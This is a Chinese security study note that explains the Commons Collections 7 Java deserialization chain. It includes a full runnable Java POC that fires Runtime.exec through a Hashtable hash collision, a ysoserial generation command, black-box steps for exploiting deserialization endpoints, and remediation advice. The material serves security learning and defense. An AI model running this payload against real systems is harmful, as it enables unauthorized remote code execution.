# CC7 利用链（Commons Collections 7 反序列化命令执行链）

> [!abstract] 原理一句话
> 把两个 `LazyMap` 塞进 `Hashtable` 当 key，靠精心构造的 hash 碰撞让反序列化重建哈希表时对两个 key 做 `equals()` 比较；`AbstractMap.equals()` 的实现会对着另一个 Map 调 `get()`——撞上 LazyMap 的懒加载陷阱，`ChainedTransformer` 开火，反射执行 `Runtime.exec()`。

完整调用顺序（ysoserial 源码原文）：
```text
        ObjectInputStream.readObject()
            Hashtable.readObject()
                Hashtable.reconstitutionPut()
                    AbstractMapDecorator.equals()
                        AbstractMap.equals()
                            LazyMap.get()
                                ChainedTransformer.transform()
                                    ConstantTransformer.transform()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Class.getMethod()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Runtime.getRuntime()
                                    InvokerTransformer.transform()
                                        Method.invoke()
                                            Runtime.exec()
```

前置阅读：[[URLDNS利用链]]（先用它探测反序列化入口是否存在）、[[ysoserial使用]]
中后段命令执行引擎与 [[CC5利用链]] 完全相同，详解见其 §2.3–2.5。

---
## 1. CC7 是怎么来的

### 1.1 概括

CC7 是 CC 家族里"最干净"的一条链：入口 `java.util.Hashtable` 是 JDK 公开 API，全程不碰 `sun.*` 内部类、不用动态代理，所以==没有 CC1 那种 JDK 版本硬限制==，JDK 7/8 通杀。它证明了一件事：哪怕只用 Java 集合框架最基础的"哈希冲突时比较 key 是否相等"这一规定动作，也能把执行流引进 LazyMap。
### 1.2 细节：hash 碰撞是整条链的扳机

- `Hashtable` 用 key 的 `hashCode()` 分桶，反序列化重建时若两个 key 落进同一桶，必须调 `equals()` 判断去重。
- CC7 用 `LazyMap` 当 key：它的 `hashCode()` 继承自 `AbstractMap`，等于所有 entry 的 `key.hashCode() ^ value.hashCode()` 之和——所以==只要让两个 LazyMap 里各放一个 hash 相同的字符串 key，两个 Map 的 hashCode 就相同==。
- 经典碰撞对：`"yy"` 与 `"zZ"`（`hashCode()` 都是 3872）， ysoserial 用的就是它们。

> [!note] 说明
> String.hashCode() 是 31 进制累加：`h = h*31 + c`。`"yy"` = 121×31+121 = 3872；`"zZ"` = 122×31+90 = 3872。差值互相抵消，碰撞天然存在。这类短串碰撞对在哈希攻击里很常用。

---

## 2. 原理跟踪：逐段源码走读

### 2.1 入口：Hashtable.readObject() / reconstitutionPut()（JDK 8 源码）
```java
// java.util.Hashtable —— JDK 公开 API，非 sun.* 内部类
private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException {
    s.defaultReadObject();
    // ... 重建哈希桶数组 table，略
    for (; elements > 0; elements--) {
        Object key = s.readObject();      // 依次读出 key（我们的两个 LazyMap）
        Object value = s.readObject();
        reconstitutionPut(table, key, value); // ⭐ 逐个放回桶里
    }
}

private void reconstitutionPut(Entry<?,?>[] tab, Object key, Object value) {
    int hash = key.hashCode();            // LazyMap.hashCode → AbstractMap 求和，两个 key 结果相同
    int index = (hash & 0x7FFFFFFF) % tab.length;
    for (Entry<?,?> e = tab[index]; e != null; e = e.next) {
        if ((e.hash == hash) && e.key.equals(key)) { // ⭐⭐ 同桶同 hash → 对第一个 LazyMap 调 equals(第二个 LazyMap)
            throw new java.io.StreamCorruptedException();
        }
    }
    // 无重复则插入桶头，略
}
```
- `reconstitutionPut` 的本意是防重复 key：反序列化流里若有两个 hash 相同且 equals 的 key，说明数据损坏。
- 攻击者要的就是这次 `equals()`——==只要 hash 碰撞，equals 必调==，且不依赖任何业务代码。
- 注意触发点在 `e.key.equals(key)`：是**先反序列化出来的那个 LazyMap**（接收者）对后一个调 equals。

### 2.2 跳板：AbstractMapDecorator.equals() → AbstractMap.equals()
```java
// org.apache.commons.collections.map.AbstractMapDecorator（LazyMap 的父类）
public boolean equals(Object object) {
    if (object == this) {
        return true;
    }
    return map.equals(object);   // ⭐ 委托给被装饰的 innerMap（HashMap）
}

// java.util.AbstractMap（HashMap 的父类）的 equals 实现
public boolean equals(Object o) {
    if (!(o instanceof Map)) return false;
    Map<K,V> m = (Map<K,V>) o;
    // ...
    for (Entry<K, V> e : entrySet()) {     // 遍历自己的每个 entry
        K key = e.getKey();
        V value = e.getValue();
        if (value == null) {
            if (!(m.get(key) == null && m.containsKey(key))) return false;
        } else {
            if (!value.equals(m.get(key))) return false;  // ⭐⭐ 对另一个 Map 调 get(key)！
        }
    }
    return true;
}
```
- `LazyMap1.equals(lazyMap2)` → `innerMap1.equals(lazyMap2)` → AbstractMap.equals 遍历 innerMap1 的每个 entry，拿它的 key 去 `lazyMap2.get(key)`。
- 比对的"另一个 Map"正是 LazyMap → 落进懒加载陷阱。
- 这一层是纯跳板：把 **equals 调用** 翻译成 **get 调用**（与 CC5 的 toString→get、CC6 的 hashCode→get 同一套路，又换了个规定动作）。

### 2.3 命令执行引擎（与 CC5 完全同款）

- `LazyMap.get()` 懒加载陷阱：见 [[CC5利用链]] §2.3。
- `ChainedTransformer + InvokerTransformer` 反射接力：见 [[CC5利用链]] §2.4。
- Transformer 流水线四步曲：见 [[CC5利用链]] §2.5，Transformer 数组一模一样，不重复展开。

---

## 3. 触发条件

| 条件 | 说明 | 黑盒怎么判断 |
|------|------|--------------|
| classpath 上有 commons-collections 3.0~3.2.1 | 命令执行引擎依赖 | 报错堆栈泄露包名、依赖指纹、已知组件版本 |
| 存在反序列化入口 | 业务代码对用户可控数据调用 `ObjectInputStream.readObject()` | 流量中出现 `rO0AB`（Base64）或 `AC ED 00 05`（二进制头） |
| JDK 版本 | ==基本不限==（Hashtable 是公开 API，触发逻辑从未被改） | — |
| 无额外防护 | 依赖未升级到 3.2.2+ / 无 JEP 290 过滤器 | — |

> [!warning] 环境边界
> commons-collections **3.2.2+ / collections4 4.1+** 加了 functor 反序列化防护，链直接断（见第 5 节）。CC7 对 JDK 版本不敏感，是 CC1 哑火（JDK > 8u71）时的常用替代选项之一。

---

## 4. 实操复现

### 4.1 环境准备

- JDK 8：本机路径 `D:\code\Env\java8\JDK`（⭐ 反序列化实验统一用 JDK 8）
- commons-collections 3.2.1 jar：`D:\code\libs\commons-collections-3.2.1.jar`
- IDEA（打断点跟调用链用）

### 4.2 手写 POC（完整可运行）

```java
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

public class CC7Poc {
    public static void main(String[] args) throws Exception {
        // ⭐ 第一步：哑弹链占位——CC7 里这是硬性要求，不是防御性写法（原因见第四步）
        ChainedTransformer chain = new ChainedTransformer(
                new Transformer[]{ new ConstantTransformer(1) });

        // ⭐ 第二步：真引信（四步反射接力，与 CC5 §2.5 完全相同）
        Transformer[] realChain = new Transformer[]{
                new ConstantTransformer(Runtime.class),                 // ① 送入 Runtime.class
                new InvokerTransformer("getMethod",
                        new Class[]{ String.class, Class[].class },
                        new Object[]{ "getRuntime", new Class[0] }),    // ② getMethod("getRuntime")
                new InvokerTransformer("invoke",
                        new Class[]{ Object.class, Object[].class },
                        new Object[]{ null, new Object[0] }),           // ③ invoke(null) 拿 Runtime 实例
                new InvokerTransformer("exec",
                        new Class[]{ String.class },
                        new Object[]{ "calc" }),                        // ④ exec("calc")
                new ConstantTransformer(1) };                           // ⑤ 收尾：吞掉 Process 返回值

        // ⭐ 第三步：构造两个"hash 相同、内容不同"的 LazyMap
        Map innerMap1 = new HashMap();
        Map innerMap2 = new HashMap();
        Map lazyMap1 = LazyMap.decorate(innerMap1, chain);
        Map lazyMap2 = LazyMap.decorate(innerMap2, chain);
        lazyMap1.put("yy", 1);   // "yy".hashCode() == 3872
        lazyMap2.put("zZ", 1);   // "zZ".hashCode() == 3872 → 两个 LazyMap 的 hashCode 相同

        // ⭐ 第四步：放进 Hashtable——put 第二个 key 时本地就会触发一次 equals！
        // Hashtable.put 也要查重：hash 相同 → lazyMap1.equals(lazyMap2)
        // → lazyMap2.get("yy") → innerMap2 里被写入 ("yy", 哑弹结果)
        // 哑弹链此时是保命的：没有它，攻击机本地先弹一次计算器
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap1, 1);
        hashtable.put(lazyMap2, 1);

        // ⭐ 第五步：还原碰撞现场——把上一步意外写进 innerMap2 的 "yy" 删掉
        // 不删的话两个 LazyMap 内容变成一样，序列化后 hash 仍相同但 equals 提前为 true 走不到 get
        lazyMap2.remove("yy");

        // ⭐ 第六步：离手前换真引信
        Field tfField = ChainedTransformer.class.getDeclaredField("iTransformers");
        tfField.setAccessible(true);
        tfField.set(chain, realChain);

        // ⭐ 第七步：序列化落盘
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("cc7.bin"));
        oos.writeObject(hashtable);
        oos.close();
        System.out.println("payload 写入 cc7.bin");

        // ⭐ 第八步：本地反序列化验证（模拟服务端 readObject）
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("cc7.bin"));
        ois.readObject();              // 💥 reconstitutionPut → equals → get → 弹计算器
    }
}
```

编译运行（裸 javac 方式，JDK 8 + jar 在 classpath）：

```bash
# ⭐ 编译（-encoding UTF-8 防止中文注释乱码）
"D:\code\Env\java8\JDK\bin\javac" -encoding UTF-8 -cp "D:\code\libs\commons-collections-3.2.1.jar" CC7Poc.java

# ⭐ 运行（Windows 下 classpath 分隔符是分号）
"D:\code\Env\java8\JDK\bin\java" -cp ".;D:\code\libs\commons-collections-3.2.1.jar" CC7Poc
```

> [!bug] 两个新手必踩的坑
> ① **`hashtable.put` 阶段本地就会"半触发"**：put 第二个 key 时查重逻辑已经走完一遍 `equals → get`，innerMap2 被写入 `"yy"`。忘记 `lazyMap2.remove("yy")` 的话，序列化出去的 payload 到目标端 equals 直接返回 true（或走不到 get 分支），==哑火==。
> ② **哑弹链是硬性要求**：和 CC6 一样，组装期就有强制触发点。用真链直接组装，攻击机本地先执行命令；而且 transform 结果被缓存进 innerMap 后，还会污染后续 equals 比较。

### 4.3 调试跟踪（原理验证）

按顺序在下表位置打断点，观察 equals 如何一步步变成命令执行：

| # | 断点位置 | 观察点 |
|---|----------|--------|
| 1 | `Hashtable.reconstitutionPut` | 第二个 key 进来时 `hash` 与桶内已有 entry 相同 → 进入 `e.key.equals(key)` |
| 2 | `AbstractMapDecorator.equals` | 委托给 `map.equals(object)`，单步进入 |
| 3 | `AbstractMap.equals` | 遍历 entrySet，走到 `m.get(key)`——m 的类型是 `LazyMap` |
| 4 | `LazyMap.get` | `containsKey("yy") == false` → 进入 `factory.transform(key)` |
| 5 | `ChainedTransformer.transform` / `InvokerTransformer.transform` | 同 CC5 §4.3，object 逐步变身至 `exec("calc")` |

### 4.4 用 ysoserial 一键生成 + 黑盒定位思路

```bash
# ⭐ 生成 CC7 payload（命令按目标场景替换，Linux 下如 "ping xxx.dnslog.cn"）
java -jar ysoserial.jar CommonsCollections7 "calc" > cc7.bin
```

黑盒实战中的定位思路（与 CC5 §4.4 相同，CC7 不需要第 3 步的 JDK 版本确认）：

1. **找入口**：流量里出现 `rO0AB` / `AC ED 00 05` → 存在反序列化点。
2. **探回显**：先打 [[URLDNS利用链]]，DNSLog 收到请求 = 入口确认可达。
3. **验依赖**：确认 commons-collections 3.x（报错堆栈、组件指纹）。
4. **上执行**：换 CC7 payload，先用 DNSLog/延时验证，再考虑交互。

---

## 5. 修复方案

与 [[CC5利用链]] §5 完全一致（同一个引擎，同一份药方）：

| 层面 | 措施 | 说明 |
|------|------|------|
| 依赖库（根治） | commons-collections 升级 **3.2.2+**（或 collections4 4.1+） | functor 反序列化默认禁用，链断在第一环 |
| JDK 侧 | JEP 290 序列化过滤器（JDK 9 原生、8u121+ 回移） | 黑/白名单拒绝 CC 危险类 |
| 流量层 | WAF / 接入层检测 | `AC ED 00 05`、`rO0AB`、超大请求体 |
| 业务层（根治） | 不对不可信数据 `readObject()` | 复杂结构传输改用 JSON 等无代码语义的协议 |

> [!important] 关键结论
> CC7 再次印证 CC5 的结论：**入口类可以是任何"反序列化期间有规定动作"的 JDK 类**——Hashtable 的查重 equals、异常类的 toString、HashSet 的 hashCode，全是可利用的"自动扳机"。把 commons-collections 从 classpath 清掉（或升级），所有 CC 链一次性团灭。

---

## 6. 与姊妹链的关系

CC1 / CC5 / CC6 的逐项对比表见 [[CC5利用链]] §6，此处只记 CC7 独有的两个标签：

- ==唯一全程只用 JDK 公开 API 的 CC 链==：不碰 `sun.*`、不用动态代理，JDK 7/8/8u71+ 通杀。
- ==唯一利用 hash 碰撞做扳机的 CC 链==：触发依赖 `"yy"/"zZ"` 这类碰撞对，组装期还多一步 `remove` 还原现场，构造手法最"讲究"。

---

## 本篇关联

- 前置知识：[[URLDNS利用链]] —— 反序列化入口探测，黑盒第一步
- 工具使用：[[ysoserial使用]] —— 一键生成 CC7 payload
- 同族利用链：[[CC1利用链]]（动态代理入口，≤ 8u71）、[[CC5利用链]]（toString 入口）、[[CC6利用链]]（hashCode 入口，待补笔记）

> 本笔记仅用于授权测试与安全学习，未经授权对他人系统测试属于违法行为。
